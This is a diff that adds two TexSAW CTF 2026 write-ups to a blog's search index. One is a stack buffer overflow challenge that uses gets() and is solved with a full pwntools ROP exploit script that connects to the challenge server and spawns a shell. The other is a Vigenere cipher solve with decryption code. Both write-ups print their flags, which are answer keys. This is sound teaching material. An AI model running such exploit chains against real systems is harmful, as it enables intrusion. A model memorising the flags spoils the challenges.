@@ -10070,4 +10070,156 @@ manage the gap and maintain the lead together.</p>
         <tag>osint</tag>
       </tags>
   </entry>
+  <entry>
+    <title>TexSAW CTF 2026 Return to Sender</title>
+    <url>/wp/TexSAW2026/texsaw2026-return-to-sender/</url>
+    <content><![CDATA[<blockquote>
+<p>Do you ever wonder what happens to your packages? So does your mail
+carrier.</p>
+</blockquote>
+<blockquote>
+<p><code>nc 143.198.163.4 15858</code></p>
+</blockquote>
+<blockquote>
+<p><strong>Flag format:</strong> <code>texsaw&#123;example_flag&#125;</code></p>
+</blockquote>
+<h2 id="solution">Solution</h2>
+<h3 id="initial-analysis">1. Initial Analysis</h3>
+<p>We start by analyzing the binary’s protections:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec chall</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>No Stack Canary:</strong> This means we can easily overwrite
+the return address on the stack.</li>
+<li><strong>NX Disabled:</strong> The stack is executable, but we don’t
+necessarily need shellcode for this exploit.</li>
+<li><strong>PIE Disabled:</strong> Function addresses are static and
+will not change between runs.</li>
+</ul>
+<h3 id="identifying-vulnerabilities">2. Identifying Vulnerabilities</h3>
+<p>Using <code>objdump</code> and <code>nm</code>, we identify several
+interesting functions:</p>
+<ul>
+<li><code>main</code>: The entry point.</li>
+<li><code>deliver</code>: Called by <code>main</code>; uses the unsafe
+<code>gets()</code> function to read input into a 32-byte buffer.</li>
+<li><code>drive</code>: A hidden function that checks an argument and,
+if correct, calls <code>system("/bin/sh")</code>.</li>
+<li><code>tool</code>: Contains a useful ROP gadget:
+<code>pop rdi; ret</code>.</li>
+</ul>
+<p>The vulnerable <code>deliver</code> function looks like this:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">deliver</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  gets(s1); <span class="comment">// VULNERABILITY: No length check!</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Since <code>gets()</code> does not check the input length, we can
+provide a payload larger than 32 bytes to overwrite the saved
+instruction pointer on the stack.</p>
+<h3 id="exploitation-strategy">3. Exploitation Strategy</h3>
+<p>The <code>drive()</code> function is our target:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">drive</span><span class="params">(__int64 a1)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (a1 != <span class="number">0x48435344</span>) <span class="comment">// &quot;HCSD&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Need the secret key to deliver this package.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>To get a shell, we need to call <code>drive(0x48435344)</code>. In
+the x86-64 calling convention, the first argument is passed in the
+<code>RDI</code> register.</p>
+<p><strong>Our ROP Chain Plan:</strong></p>
+<ol type="1">
+<li>Overwrite the return address with the address of a
+<code>pop rdi; ret</code> gadget.</li>
+<li>Provide the value <code>0x48435344</code> as the next item on the
+stack (to be popped into <code>RDI</code>).</li>
+<li>Include a <code>ret</code> gadget for stack alignment (often
+necessary for <code>system()</code> calls in 64-bit glibc).</li>
+<li>Finally, call the <code>drive</code> function.</li>
+</ol>
+<h3 id="exploit-script">4. Exploit Script</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = binary = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Found addresses</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4011be</span></span><br><span class="line">ret_gadget = <span class="number">0x4011bf</span></span><br><span class="line">drive_addr = <span class="number">0x401211</span></span><br><span class="line">secret_arg = <span class="number">0x48435344</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding: 32 bytes (buffer) + 8 bytes (saved RBP) = 40 bytes</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">40</span></span><br><span class="line">payload += p64(ret_gadget)  <span class="comment"># Stack alignment</span></span><br><span class="line">payload += p64(pop_rdi_ret) <span class="comment"># Gadget to set RDI</span></span><br><span class="line">payload += p64(secret_arg)  <span class="comment"># The argument &quot;HCSD&quot;</span></span><br><span class="line">payload += p64(drive_addr)  <span class="comment"># Call drive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect and exploit</span></span><br><span class="line">p = remote(<span class="string">&#x27;143.198.163.4&#x27;</span>, <span class="number">15858</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;2 Canary Court\n\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="flag">Flag</h2>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">texsaw{sm@sh_st4ck_2_r3turn_to_4nywh3re_y0u_w4nt}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+        <tag>bof</tag>
+        <tag>rop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TexSAW CTF 2026 The Imitation Game</title>
+    <url>/wp/TexSAW2026/texsaw2026-the-imitation-game/</url>
+    <content><![CDATA[<blockquote>
+<p>There’s a spy amongst us! We found one of their messages, but can’t
+seem to crack it. For some reason, they wrote the message down
+twice.</p>
+</blockquote>
+<p>The challenge provides two large blocks of ciphertext, both starting
+with what appears to be an encrypted flag.</p>
+<h2 id="solution">Solution</h2>
+<h3 id="identifying-the-cipher">1. Identifying the Cipher</h3>
+<p>We are given two different ciphertexts that supposedly represent the
+same message. This immediately suggests a polyalphabetic substitution
+cipher, most likely <strong>Vigenere</strong>, where different parts of
+the key are being applied to the same plaintext.</p>
+<h3 id="deducing-the-key-prefix">2. Deducing the Key Prefix</h3>
+<p>We know that the flags in this CTF follow the format
+<code>texsaw&#123;...&#125;</code>. By comparing the ciphertext prefixes with the
+known plaintext <code>texsaw</code>, we can calculate the key characters
+used at the start of each block (<span
+class="math inline"><em>K</em><em>e</em><em>y</em> = <em>C</em><em>i</em><em>p</em><em>h</em><em>e</em><em>r</em><em>t</em><em>e</em><em>x</em><em>t</em> − <em>P</em><em>l</em><em>a</em><em>i</em><em>n</em><em>t</em><em>e</em><em>x</em><em>t</em></span>).</p>
+<p><strong>Block 1 Prefix (<code>twhsnz</code>):</strong></p>
+<ul>
+<li><code>t</code> - <code>t</code> = <strong>A</strong> (0)</li>
+<li><code>w</code> - <code>e</code> = <strong>S</strong> (18)</li>
+<li><code>h</code> - <code>x</code> = <strong>K</strong> (10)</li>
+<li><code>s</code> - <code>s</code> = <strong>A</strong> (0)</li>
+<li><code>n</code> - <code>a</code> = <strong>N</strong> (13)</li>
+<li><code>z</code> - <code>w</code> = <strong>D</strong> (3)</li>
+<li><strong>Key Prefix:</strong> <code>ASKAND</code></li>
+</ul>
+<p><strong>Block 2 Prefix (<code>brassg</code>):</strong></p>
+<ul>
+<li><code>b</code> - <code>t</code> = <strong>I</strong> (8)</li>
+<li><code>r</code> - <code>e</code> = <strong>N</strong> (13)</li>
+<li><code>a</code> - <code>x</code> = <strong>D</strong> (3)</li>
+<li><code>s</code> - <code>s</code> = <strong>A</strong> (0)</li>
+<li><code>s</code> - <code>a</code> = <strong>S</strong> (18)</li>
+<li><code>g</code> - <code>w</code> = <strong>K</strong> (10)</li>
+<li><strong>Key Prefix:</strong> <code>INDASK</code></li>
+</ul>
+<h3 id="recovering-the-full-key">3. Recovering the Full Key</h3>
+<p>The fragments <code>ASKAND</code> and <code>INDASK</code> strongly
+suggest a famous quote from the Bible (Matthew 7:7):</p>
+<blockquote>
+<p><em>“<strong>Ask, and</strong> it shall be given you; seek, and ye
+shall f<strong>ind: ask, and</strong>…”</em></p>
+</blockquote>
+<p>By removing spaces and punctuation, we derive the full 41-character
+repeating key:
+<code>ASKANDITSHALLBEGIVENYOUSEEKANDYESHALLFIND</code></p>
+<h3 id="decrypting-the-message">4. Decrypting the Message</h3>
+<p>Using the recovered key, we can decrypt the rest of the message. The
+first message block uses an offset of 0, while the second block starts
+at a different position in the key loop.</p>
+<p>Decryption reveals a message from a spy:</p>
+<blockquote>
+<p><em>“they know im here, and its only a matter of time before they
+find out who i am. tell the general what the flag is as soon as
+possible…”</em></p>
+</blockquote>
+<p>The signature at the bottom, <code>- john cairncross</code>, refers
+to the real-life British intelligence officer who was a double agent for
+the Soviet Union during World War II.</p>
+<h3 id="extracting-the-flag">5. Extracting the Flag</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt</span>(<span class="params">ct, key, offset=<span class="number">0</span></span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    k_idx = offset</span><br><span class="line">    key = key.lower()</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> &lt;= char &lt;= <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            shift = <span class="built_in">ord</span>(key[k_idx % <span class="built_in">len</span>(key)]) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">            res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">            k_idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;A&quot;</span> &lt;= char &lt;= <span class="string">&quot;Z&quot;</span>:</span><br><span class="line">            shift = <span class="built_in">ord</span>(key[k_idx % <span class="built_in">len</span>(key)]) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">            res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">            k_idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += char</span><br><span class="line">            <span class="comment"># k_idx is NOT incremented for non-alpha</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;askanditshallbegivenyouseekandyeshallfind&quot;</span></span><br><span class="line"></span><br><span class="line">ct1 = <span class="string">&quot;twhsnz&#123;tngqmqdhqqygxrloyehuvxtwwvxklkiiudpxqcvqhbmkepledu&#125;&quot;</span></span><br><span class="line">ct2 = <span class="string">&quot;brassg&#123;lhrrfxzgxvrpzmierkrkdbkdyeibpredxbrflvvvotgvfisacb&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># just loop and try offset</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CT1:&quot;</span>, vigenere_decrypt(ct1, key, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CT2:&quot;</span>, vigenere_decrypt(ct2, key, <span class="number">38</span>))</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">&quot;&quot;&quot;zpzc xlcq aq lorr, dlh aas zyqg n paldee rn mate mpgsxm olrw tcfh set jkm m st.</span></span><br><span class="line"><span class="string">tpwq buh gwxeedt pzht esf jrib mf yg mgsr ks crqwailp.</span></span><br><span class="line"><span class="string">ejty whw qeahztd ieqzsi zpzc sgbx gyx ghruc me oiotso!</span></span><br><span class="line"><span class="string">vi adv gbha pwsl, t&#x27;wm qkmo cbs on gyv pievr qwlttyl tbfalsoa wwfgyrzh bx sqyrvevn.</span></span><br><span class="line"><span class="string">eeoo shuc cgb&#x27;rp ytb srldywrg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">x.l. loe xzwmk &quot;qhmgyhcgr kkmr&quot; lq zwyy rztl. lru krohol psacs tu anmi cbs quf.</span></span><br><span class="line"><span class="string">- nsrn pdgvfjrzdx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nMessage 1:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(vigenere_decrypt(msg1, key, <span class="number">15</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="flag">Flag</h2>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">texsaw{luojmfsgmkqltenaemdqlxgtyrfdlzxdmqmxysvdettsxpatcq}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>crypto</tag>
+        <tag>vigenere</tag>
+      </tags>
+  </entry>
 </search>
